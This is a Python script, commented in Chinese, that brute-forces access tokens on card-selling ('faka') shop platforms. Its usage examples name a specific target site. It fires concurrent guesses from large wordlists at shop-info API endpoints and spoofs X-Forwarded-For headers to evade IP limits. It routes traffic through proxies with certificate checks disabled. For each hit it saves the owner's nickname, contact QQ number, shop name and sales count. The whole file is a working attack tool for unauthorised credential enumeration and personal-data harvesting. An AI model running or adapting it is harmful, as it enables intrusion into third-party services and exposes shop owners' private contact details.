#!/usr/bin/env python3
"""
发卡店铺 token 并发扫描。

支持:
  pyfaas  - POST /shopApi/Shop/info  {"token":"xxx"}
  acg     - POST /user/api/site/info 或自定义

示例:
  python3 shop_token_scan.py -u https://s.sggyx.com -f /data/wordlists/faka/faka-tokens-combo.txt -w 50
  python3 shop_token_scan.py -u https://s.sggyx.com --tokens 888,666,xiaoy
  python3 shop_token_scan.py -u https://s.sggyx.com -f /data/wordlists/faka/faka-tokens.txt --offset 0 --limit 100000
"""
from __future__ import annotations

import argparse
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, load_wordlist, log, random_xff_headers, save_hit

PLATFORMS = {
    "pyfaas": {
        "path": "/shopApi/Shop/info",
        "method": "json",
        "field": "token",
        "ok": lambda j: isinstance(j, dict) and j.get("code") == 1 and isinstance(j.get("data"), dict),
    },
    "acg": {
        "path": "/user/api/site/info",
        "method": "get",
        "field": None,
        "ok": lambda j: isinstance(j, dict) and j.get("code") == 200,
    },
}


def probe_token(
    base: str,
    token: str,
    plat: dict,
    timeout: int,
    proxy: str,
    use_xff: bool,
) -> tuple[str, bool, Any]:
    url = base.rstrip("/") + plat["path"]
    headers = {"User-Agent": DEFAULT_UA, "Content-Type": "application/json"}
    if use_xff:
        headers.update(random_xff_headers())
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        if plat["method"] == "json":
            body = {plat["field"]: token}
            r = requests.post(url, json=body, headers=headers, timeout=timeout, proxies=proxies, verify=False)
        else:
            r = requests.get(url, headers=headers, timeout=timeout, proxies=proxies, verify=False)
        data = json_or_text(r)
        ok = plat["ok"](data) if isinstance(data, dict) else False
        return token, ok, data
    except Exception as e:
        return token, False, str(e)


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="店铺 token 扫描")
    ap.add_argument("-u", "--url", required=True, help="目标根 URL")
    ap.add_argument("-f", "--wordlist", default="/data/wordlists/faka/faka-tokens-combo.txt")
    ap.add_argument("--tokens", default="", help="逗号分隔，优先于字典")
    ap.add_argument("--platform", choices=PLATFORMS.keys(), default="pyfaas")
    ap.add_argument("-w", "--workers", type=int, default=30)
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--delay", type=float, default=0.0, help="每个请求前 sleep")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--proxy", default="")
    ap.add_argument("--xff", action="store_true", help="随机 XFF 头")
    ap.add_argument("--out", default="/data/tools/faka/out/shop_tokens.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    plat = PLATFORMS[args.platform]

    if args.tokens:
        tokens = [t.strip() for t in args.tokens.split(",") if t.strip()]
    else:
        limit = args.limit or None
        tokens = list(load_wordlist(args.wordlist, offset=args.offset, limit=limit))

    log(f"扫描 {args.url} | platform={args.platform} | tokens={len(tokens):,} | workers={args.workers}")
    hits = 0
    start = time.time()

    def task(tok: str):
        if args.delay:
            time.sleep(args.delay)
        return probe_token(args.url, tok, plat, args.timeout, args.proxy, args.xff)

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(task, t): t for t in tokens}
        for i, fut in enumerate(as_completed(futs), 1):
            token, ok, data = fut.result()
            if ok:
                hits += 1
                brief = data.get("data") if isinstance(data, dict) else data
                if isinstance(brief, dict):
                    brief = {k: brief.get(k) for k in ("nickname", "link", "sell_count", "contact_qq", "shop_name", "title")}
                save_hit(Path(args.out), "shop_token", {"url": args.url, "token": token, "data": brief})
                log(f"[+] HIT {token} -> {json.dumps(brief, ensure_ascii=False)[:200]}")
            if i % 500 == 0:
                log(f"  progress {i:,}/{len(tokens):,} hits={hits}")

    elapsed = time.time() - start
    log(f"完成: hits={hits} elapsed={elapsed:.1f}s -> {args.out}")


if __name__ == "__main__":
    main()
